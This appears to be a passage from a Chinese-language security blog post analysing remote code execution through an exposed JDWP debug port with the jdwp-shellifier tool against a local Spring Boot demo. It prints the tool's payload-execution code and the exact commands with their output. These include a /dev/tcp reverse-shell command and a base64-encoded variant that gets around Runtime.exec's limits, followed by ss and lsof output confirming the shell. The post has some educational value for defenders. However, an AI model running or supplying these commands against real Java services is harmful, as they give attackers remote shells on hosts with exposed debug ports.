    rId = jdwp.send_event( EVENT_BREAKPOINT, *data )
第五步，等待程序运行至断点处，运行完毕之后清除断点。
    # 4. resume vm and wait for event
    jdwp.resumevm()
    print ("[+] Waiting for an event on '%s'" % args.break_on)
    while True:
        buf = jdwp.wait_for_event()
        ret = jdwp.parse_event_breakpoint(buf, rId)
        if ret is not None:
            break
    rId, tId, loc = ret
    print ("[+] Received matching event from thread %#x" % tId)
    jdwp.clear_event(EVENT_BREAKPOINT, rId)
第六步，执行自定义的命令
    def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command):
        #
        # This function will invoke command as a payload, which will be running
        # with JVM privilege on host (intrusive).
        #
        print ("[+] Selected payload '%s'" % command)
        # 1. allocating string containing our command to exec()
        cmdObjIds = jdwp.createstring( command )
        if len(cmdObjIds) == 0:
            print ("[-] Failed to allocate command")
            return False
        cmdObjId = cmdObjIds[0]["objId"]
        print ("[+] Command string object created id:%x" % cmdObjId)
        # 2. use context to get Runtime object
        buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
        if buf[0] != chr(TAG_OBJECT):
            print ("[-] Unexpected returned type: expecting Object")
            return False
        rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
        if rt is None:
            print "[-] Failed to invoke Runtime.getRuntime()"
            return False
        print ("[+] Runtime.getRuntime() returned context id:%#x" % rt)
        # 3. find exec() method
        execMeth = jdwp.get_method_by_name("exec")
        if execMeth is None:
            print ("[-] Cannot find method Runtime.exec()")
            return False
        print ("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])
        # 4. call exec() in this context with the alloc-ed  
        data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
        buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
        if buf[0] != chr(TAG_OBJECT):
            print ("[-] Unexpected returned type: expecting Object")
            return False
        print(buf)
        retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
        print ("[+] Runtime.exec() successful, retId=%x" % retId)
        return True
    # 5. Now we can execute any code
        if args.cmd:
            runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
        else:
            # by default, only prints out few system properties
            runtime_exec_info(jdwp, tId)
        jdwp.resumevm()
在中最关键的就是：
    data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ] # 得到需要执行的反复噶
    buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)  #利用Runtime.getRuntime().exec()执行。
上面的代码就等价于Java中的：
    Class cls = Class.forName("java.lang.Runtime");
    Method m = cls.getMethod("getRuntime");
    Method exec = cls.getMethod("exec", String.class);
    // 执行getRuntime()方法，等价于 Object o = Runtime.getRuntime();
    Object o = m.invoke(cls,null);
    // 执行exec方法，等价于 Runtime.getRuntime().exec(command)
    exec.invoke(o,command);
以上就是整个执行流程。
#### 反弹shell
`demo.jar`是一个springboot的程序，核心逻辑如下：
    public class DemoApplication {
        public static void main(String[] args) {
            SpringApplication.run(DemoApplication.class, args);
        }
        @RequestMapping(path = {"/","/index"}, method = {RequestMethod.GET})
        public String index(Model model) throws Exception {
            int result = "12345".indexOf(0);
            System.out.println(result);
            return "index";
        }
    }
那么我们就可以尝试通过如下的方式进行反弹shell。
    python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd 'touch exploit.txt'
结果输出的结果如下：
    python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd 'touch exploit.txt'
    [+] Targeting '127.0.0.1:9999'
    [+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_191'
    [+] Found Runtime class: id=150e
    [+] Found Runtime.getRuntime(): id=7ff960045930
    [+] Created break event id=2
    [+] Waiting for an event on 'java.lang.String.indexOf'
    [+] Received matching event from thread 0x15fa
    [+] Selected payload 'touch exploit.txt'
    [+] Command string object created id:15fb
    [+] Runtime.getRuntime() returned context id:0x15fc
    [+] found Runtime.exec(): id=7ff960011e10
    [+] Runtime.exec() successful, retId=15fd
    [!] Command successfully executed
在`demo.jar`的统计目录下查看文件：
    drwxrwxr-x 2 username username     4096 Apr 18 13:47 .
    drwxrwxr-x 8 username username     4096 Apr  7 20:39 ..
    -rw-rw-r-- 1 username username 16726504 Apr 16 20:41 demo.jar
    -rw-r--r-- 1 username username        0 Apr 18 13:47 exploit.txt
说明成功执行了cmd参数中的命令，那么我们有如何反弹shell呢?我们按照常规的反弹shell的思路,`python jdwp-shellifier.py
-t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd '/bin/bash -i
>& /dev/tcp/127.0.0.1/12345 0>&1'`，最终的运行结果如下：
    python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd '/bin/bash -i >& /dev/tcp/127.0.0.1/12345 0>&1'
    [+] Targeting '127.0.0.1:9999'
    [+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_191'
    [+] Found Runtime class: id=1645
    [+] Found Runtime.getRuntime(): id=7ff960045930
    [+] Created break event id=2
    [+] Waiting for an event on 'java.lang.String.indexOf'
    [+] Received matching event from thread 0x1731
    [+] Selected payload '/bin/bash -i >& /dev/tcp/127.0.0.1/12345 0>&1'
    [+] Command string object created id:1732
    [+] Runtime.getRuntime() returned context id:0x1733
    [+] found Runtime.exec(): id=7ff960011e10
    [+] Runtime.exec() successful, retId=1734
    [!] Command successfully executed
虽然执行结果显示成功执行，但是实际上反弹shell并没有成功。原因其实在之前的文章[绕过exec获取反弹shell](https://blog.spoock.com/2018/11/25/getshell-bypass-exec/)中也已经讲过了，通过`Runtime.getRuntime().exec("bash -i >& /dev/tcp/ip/port
0>&1");`这种方式是无法反弹shell的。而在本例中刚好利用的是`execMeth =
jdwp.get_method_by_name("exec")`，得到就是`public Process exec(String
command)`这个`exec()`，所以就无法反弹shell。那么按照我文章提供的种种思路，都是可以成功实现反弹shell的，我们还是通过最为简单的方式
最终我们使用如下的`python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on
'java.lang.String.indexOf' --cmd 'bash -c
{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}'`
最终我们得到的结果就是:
    python jdwp-shellifier.py -t 127.0.0.1 -p 9999 --break-on 'java.lang.String.indexOf' --cmd 'bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}'
    [+] Targeting '127.0.0.1:9999'
    [+] Reading settings for 'OpenJDK 64-Bit Server VM - 1.8.0_191'
    [+] Found Runtime class: id=1511
    [+] Found Runtime.getRuntime(): id=7f2bb8046360
    [+] Created break event id=2
    [+] Waiting for an event on 'java.lang.String.indexOf'
    [+] Received matching event from thread 0x15fd
    [+] Selected payload 'bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}'
    [+] Command string object created id:15fe
    [+] Runtime.getRuntime() returned context id:0x15ff
    [+] found Runtime.exec(): id=7f2bb8010410
    [+] Runtime.exec() successful, retId=1600
    [!] Command successfully executed
最终成功地触发了反弹shell。
#### JDWP反弹流程
上面是从`jdwp-shellifier`的源代码上面对利用进行了分析，那么我们还是来分析一下在exploit过程中的端口和进程的变化。
在`indexOf`加上断点：
    (jdwp-rce/ss -anptw | grep 9999
    tcp  LISTEN     0      1                  0.0.0.0:9999             0.0.0.0:*     users:(("java",pid=9822,fd=4))                                                 
    tcp  TIME-WAIT  0      0                127.0.0.1:50644          127.0.0.1:9999                                                                                 
     (jdwp-rce/ss -anptw | grep 9999
    tcp  ESTAB     0      0                127.0.0.1:9999           127.0.0.1:50670  users:(("java",pid=9822,fd=5))                                                 
    tcp  ESTAB     0      0                127.0.0.1:50670          127.0.0.1:9999   users:(("python",pid=9978,fd=3))                                               
     (jdwp-rce/lsof -i:9999
    COMMAND  PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
    java    9822 username    5u  IPv4 366738      0t0  TCP localhost:9999->localhost:50670 (ESTABLISHED)
    python  9978 username    3u  IPv4 366868      0t0  TCP localhost:50670->localhost:9999 (ESTABLISHED)
此时是`Python`和`java`进行通信。而此时的`12345`端口只有`nc`的监听端口。
    (jdwp-rce/ss -anptw | grep 12345
    tcp  LISTEN    0      1                  0.0.0.0:12345            0.0.0.0:*      users:(("nc",pid=9977,fd=3))
此时执行访问`localhost:8888`，触发`indexOf()`方法的执行。此时观察：
    (jdwp-rce/ss -anptw | grep 12345
    tcp  LISTEN     0      1                  0.0.0.0:12345            0.0.0.0:*     users:(("nc",pid=9977,fd=3))                                                   
    tcp  ESTAB      0      0                127.0.0.1:12345          127.0.0.1:51406 users:(("nc",pid=9977,fd=4))                                                   
    tcp  ESTAB      0      0                127.0.0.1:51406          127.0.0.1:12345 users:(("bash",pid=10120,fd=2),("bash",pid=10120,fd=1),("bash",pid=10120,fd=0))
     (jdwp-rce/lsof -i:12345
    COMMAND   PID    USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
    nc       9977 username    3u  IPv4 363961      0t0  TCP *:12345 (LISTEN)
    nc       9977 username    4u  IPv4 363962      0t0  TCP localhost:12345->localhost:51406 (ESTABLISHED)
    bash    10120 username    0u  IPv4 370930      0t0  TCP localhost:51406->localhost:12345 (ESTABLISHED)
    bash    10120 username    1u  IPv4 370930      0t0  TCP localhost:51406->localhost:12345 (ESTABLISHED)
    bash    10120 username    2u  IPv4 370930      0t0  TCP localhost:51406->localhost:12345 (ESTABLISHED)
    (jdwp-rce/ps -ef | grep 10120
    username  10120 10107  0 17:31 pts/0    00:00:00 /bin/bash -i
可以看到`/bin/bash
-i`和`nc`已经建立了`ESTABLISHED`的连接，从而实现了反弹shell。为什么是这个样子？其实通过前面的分析，其实已经可以知道`JDWP`反弹shell的原理本质上还是利用的`Runtime.getRuntime().exec("bash
-i >& /dev/tcp/ip/port 0>&1");`这种方式反弹shell，所以本质上和`JAVA`并没有关系。最后的分析也证实了这一点。
### 总结
总体来说，无论什么样类型的反弹shell，其实本质上都是固定的那几种方式，可能就是前面需要绕过或者是变形一下而已。
#### 参考
  1. 
  2. 
  3. 
* * *